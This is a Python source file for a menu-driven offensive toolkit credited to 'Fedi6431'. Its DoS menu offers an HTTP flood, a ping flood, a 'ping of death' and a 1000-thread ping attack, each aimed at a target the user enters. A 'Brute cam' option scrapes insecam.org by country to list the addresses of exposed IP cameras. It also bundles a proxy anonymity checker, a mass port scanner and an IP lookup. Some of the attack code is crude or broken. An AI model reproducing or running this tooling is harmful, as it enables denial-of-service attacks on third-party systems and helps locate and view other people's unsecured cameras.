from concurrent.futures import ThreadPoolExecutor
from random import randint
import multiprocessing
from sys import stdout
from os import system
import requests
import threading
import colorama 
import socket
import time
import json
import re
import os

fake_ip = '44.197.175.168'
attack_num = 0
cls = os.system("cls")

def Attack(target, port):
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target +"HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        
        global attack_num
        attack_num += 1
        print(attack_num)
        
        s.close()

def randomIP():
    ip = ".".join(map(str, (randint(0,255)for _ in range(4))))
    return ip

def randInt():
    x = randint(1000,9000)
    return x

def Ping_flood():
    ip = str(input("Target IP: "))
    while(1):
        os.system("ping " + ip)

def Pingofdeath():
    victimIP = str(input("Target IP: "))
    pingCommand = "ping " + victimIP + " -s 4 -w 1 -n 1"
        
    while(1):
        os.system(pingCommand)

from requests.exceptions import ProxyError, ConnectTimeout

def check_proxy(proxy):
    proxies = {
        'http': proxy,
        'https': proxy
    }
    try:
        response = requests.get('https://httpbin.org/ip', proxies=proxies, timeout=(10, 10))
        if response.status_code == 200:
            return True
    except (ProxyError, ConnectTimeout) as e:
        print(f"Error checking proxy {proxy}: {e}")
    except requests.RequestException as e:
        print(f"Request error for proxy {proxy}: {e}")
    return False

def is_proxy_anonymous(proxy):
    proxies = {
        'http': proxy,
        'https': proxy
    }
    try:
        response = requests.get('https://httpbin.org/ip', proxies=proxies, timeout=0)
        if response.status_code == 200:
            client_ip = response.json().get('origin', '')
            if not client_ip.startswith(proxy.split(':')[0]):
                return True
    except requests.RequestException:
        pass
    return False

def main1():
    filename = 'proxies.txt'
    with open(filename, 'r') as file:
        proxies = [line.strip() for line in file]

    total_proxies = len(proxies)
    valid_proxies = []

    print(f"Total proxies: {total_proxies}")

    for proxy in proxies:
        print(f"Testing proxy {proxy} from list {filename}...")
        if check_proxy(proxy):
            if is_proxy_anonymous(proxy):
                valid_proxies.append(proxy)
                print(f"Proxy Valid and Anonymous")
            else:
                print(f"Proxy Valid but Not Anonymous")
        else:
            print(f"Proxy Invalid")

    print(f"\nTotal valid and anonymous proxies: {len(valid_proxies)}")
    print("Valid and anonymous proxies list:")
    for proxy in valid_proxies:
        print(proxy)

def X():
    while True:
        cls = os.system("cls")
        cls
        banner = f'''
\033[31m ___________ __             ____  ___                                __                
\033[31m \__    ___/|  |__   ____   \   \/  /    ____________   ____   _____/  |_  ___________ 
\033[31m   |    |   |  |  \_/ __ \   \     /    /  ___/\____ \_/ __ \_/ ___\   __\/  _ \_  __ \ 
\033[31m   |    |   |   Y  \  ___/   /     \   \___ \ |  |_> >  ___/\  \___|  | (  <_> )  | \/
\033[31m   |____|   |___|  /\___  > /___/\  \  ____  >|   __/ \___  >\___  >__|  \____/|__|   
\033[31m                 \/     \/        \_/      \/ |__|        \/     \/                   

                                                                        Coded by Fedi6431
|1| Proxy scanner         |98| Info
|2| Brute cam             |99| Version
|3| DoS                   
|4| IP Lookup
|5| Port scanner
        '''
        print(f"{banner}")
        ask = input(f"--> ")

        if ask == '5':
            def scan_port3(target, port):
                try:
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                        sock.settimeout(1)
                        result = sock.connect_ex((target, port))
                        if result == 0:
                            print(f"Port {port} on {target} is open ")
                except (socket.error, ConnectionRefusedError):
                    pass

            def main5(): 
                target = input(f'Enter the target IP address or www url: ')
                max_threads = 1000  
                ports_to_scan = range(1, 15000)  

                with ThreadPoolExecutor(max_threads) as executor:
                    for port in ports_to_scan:
                        executor.submit(scan_port3, target, port)

            main5()
            input(f'Press Enter to continue...')


        if ask == '4':
                def g_ip_info(ip_address):
                    url = f"https://ipinfo.io/{ip_address}/json"
                    response = requests.get(url)

                    if response.status_code == 200:
                        data = response.json()
                        return data
                    else:
                        return None

                ip_address = input(f'Enter an IP address: ')
                ip_info = g_ip_info(ip_address)

                if ip_info:
                    print(f"IP Information:")
                    print(f"IP Address: {ip_info['ip']}")
                    print(f"City: {ip_info['city']}")
                    print(f"Region: {ip_info['region']}")
                    print(f"Country: {ip_info['country']}")
                    print(f"Location: {ip_info['loc']}")
                    print(f"Organization: {ip_info['org']}")
                else:
                    print(f'IP information not found or invalid IP address')

                input(f'Press Enter to continue...')


        if ask == '1':
            print("DISCLAIMER:\nThe accuracy of this tool depends on the restrictions of the proxy you are testing.")
            print("Many public proxies use IP Rotation which sometimes prevents the successfull connection to them.")
            start = input("\nPress Enter to start checking proxies...")
            print("\n")
            main1()
            input(f'Press Enter to continue...')

        if ask == '2':
                print("""
1) United States                31) Mexico                61) Moldova
2) Japan                        32) Finland               62) Nicaragua
3) Italy                        33) China                 63) Malta
4) Korea                        34) Chile                 64) Trinidad And Tobago
5) France                       35) South Africa          65) Soudi Arabia
6) Germany                      36) Slovakia              66) Croatia
7) Taiwan                       37) Hungary               67) Cyprus
8) Russian Federation           38) Ireland               68) Pakistan
9) United Kingdom               39) Egypt                 69) United Arab Emirates
10) Netherlands                 40) Thailand              70) Kazakhstan
11) Czech Republic              41) Ukraine               71) Kuwait
12) Turkey                      42) Serbia                72) Venezuela
13) Austria                     43) Hong Kong             73) Georgia
14) Switzerland                 44) Greece                74) Montenegro
15) Spain                       45) Portugal              75) El Salvador
16) Canada                      46) Latvia                76) Luxembourg
17) Sweden                      47) Singapore             77) Curacao
18) Israel                      48) Iceland               78) Puerto Rico
19) Iran                        49) Malaysia              79) Costa Rica
20) Poland                      50) Colombia              80) Belarus
21) India                       51) Tunisia               81) Albania
22) Norway                      52) Estonia               82) Liechtenstein
23) Romania                     53) Dominican Republic    83) Bosnia And Herzegovia
24) Viet Nam                    54) Sloveania             84) Paraguay
25) Belgium                     55) Ecuador               85) Philippines
26) Brazil                      56) Lithuania             86) Faroe Islands
27) Bulgaria                    57) Palestinian           87) Guatemala
28) Indonesia                   58) New Zealand           88) Nepal
29) Denmark                     59) Bangladeh             89) Peru
30) Argentina                   60) Panama                90) Uruguay
91) Extra                       92) Andorra               93) Antigua And Barbuda
94) Armenia                     95) Angola                96) Australia
97) Aruba                       98) Azerbaijan            99) Barbados
100) Bonaire                    101) Bahamas              102) Botswana
103) Congo                      104) Ivory Coast          105) Algeria
106) Fiji                       107) Gabon                108) Guernsey
109) Greenland                  110) Guadeloupe           111) Guam
112) Guyana                     113) Honduras             114) Jersey
115) Jamaica                    116) Jordan               117) Kenya
118) Cambodia                   119) Saint Kitts          120) Cayman Islands
121) Laos                       122) Lebanon              123) Sri Lanka
124) Morocco                    125) Madagascar           126) Macedonia
127) Mongolia                   128) Macao                129) Martinique
130) Mauritius                  131) Namibia              132) New Caledonia
133) Nigeria                    134) Qatar                135) Reunion
136) Sudan                      137) Senegal              138) Suriname
139) Sao Tome And Principe      140) Syria                141) Tanzania
142) Uganda                     143) Uzbekistan           144) Saint Vincent And The Grenadines
145) Benin
                """)

                try:
                    print()
                    countries = ["US", "JP", "IT", "KR", "FR", "DE", "TW", "RU", "GB", "NL",
                                "CZ", "TR", "AT", "CH", "ES", "CA", "SE", "IL", "PL", "IR",
                                "NO", "RO", "IN", "VN", "BE", "BR", "BG", "ID", "DK", "AR",
                                "MX", "FI", "CN", "CL", "ZA", "SK", "HU", "IE", "EG", "TH",
                                "UA", "RS", "HK", "GR", "PT", "LV", "SG", "IS", "MY", "CO",
                                "TN", "EE", "DO", "SI", "EC", "LT", "PS", "NZ", "BD", "PA",
                                "MD", "NI", "MT", "TT", "SA", "HR", "CY", "PK", "AE", "KZ",
                                "KW", "VE", "GE", "ME", "SV", "LU", "CW", "PR", "CR", "BY",
                                "AL", "LI", "BA", "PY", "PH", "FO", "GT", "NP", "PE", "UY",
                                "-" , "AD", "AG", "AM", "AO", "AU", "AW", "AZ", "BB", 
                                "BQ", "BS", "BW", "CG", "CI", "DZ", "FJ", "GA", "GG", "GL",
                                "GP", "GU", "GY", "HN", "JE", "JM", "JO", "KE", "KH", "KN",
                                "KY", "LA", "LB", "LK", "MA", "MG", "MK", "MN", "MO", "MQ",
                                "MU", "NA", "NC", "NG", "QA", "RE", "SD", "SN", "SR", "ST",
                                "SY", "TZ", "UG", "UZ", "VC","BJ", ]
                    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux i686; rv:68.0) Gecko/20100101 Firefox/68.0"}

                    num = int(input("option: "))
                    if num not in range(1, 145+1):
                        raise IndexError

                    country = countries[num-1]
                    res = requests.get(
                        f"http://www.insecam.org/en/bycountry/{country}", headers=headers
                    )
                    last_page = re.findall(r'pagenavigator\("\?page=", (\d+)', res.text)[0]

                    for page in range(int(last_page)):
                        res = requests.get(
                            f"http://www.insecam.org/en/bycountry/{country}/?page={page}",
                            headers=headers
                        )
                        find_ip = re.findall(r"http://\d+.\d+.\d+.\d+:\d+", res.text)
                        for ip in find_ip:
                            print(ip)
                except:
                    pass
                finally:
                    print()
                    print("Search finish")
                    input(f'Press Enter to continue...')

        if ask == '3':
            list = '''
|1| HTTP Flood Attack       |               |
|2| Slowloris Ping Attack   | Only in admin |
|3| Ping Flood Attack       |               |
|4| Ping of Death Attack    |               |
|5| Multi Ping Attack       |               |
        '''
            print(F"{list}")
            op = input("Select option: ")
            if op == '1':
                target = str(input("Target IP: "))
                port = int(input("Target Port (80 suggested): "))
                Attack(target, port) 
                input(f'Press Enter to continue...')
                
            if op == '2':
                ip_addr = str(input("Target IP: "))
                pks = str(input("Number of packets: "))
                os.system("ping " + ip_addr + " -c " + pks)
                input(f'Press Enter to continue...')

            if op == '3':
                Ping_flood()
                input(f'Press Enter to continue...')

            if op == '4':
                Pingofdeath()
                input(f'Press Enter to continue...')

            if op == '5': 
                    ping_count = 100
                    num_bots = 1000
                    website = input(f'Enter an http url: ')
                    def send_ping():
                        for _ in range(ping_count):
                            response = os.system(f"ping -l 100 {website}")
                        print(f"Bot sent a ping to {website}: Response Code {response}")

                    threads = []
                    for _ in range(num_bots):
                        thread = threading.Thread(target=send_ping)
                        threads.append(thread)
                        thread.start()

                    start_time = time.time()
                    for thread in threads:
                        thread.join()
                    end_time = time.time()  

                    elapsed_time = end_time - start_time
                    if elapsed_time < 1.0:
                        time.sleep(0.01 - elapsed_time)
                        print(f'All bots finished pinging')
                    send_ping()
                    input(f'Press Enter to continue...')

        if ask == '98':
            infolist = '''
|----------------------------------------|
|Author: Fedi6431                        |
|----------------------------------------|
|Github: Https://www.github.com/Fedi6431 |
|----------------------------------------|
        '''
            print(f"{infolist}")
            input(f'Press Enter to continue...')

        if ask == '99':
            verlist = '''
|---------------------------|
|    Version     |   Type   |
|     1.0        |   Alfa   |
|---------------------------|
        '''
            print(f"{verlist}")
            input(f'Press Enter to continue...')

X()
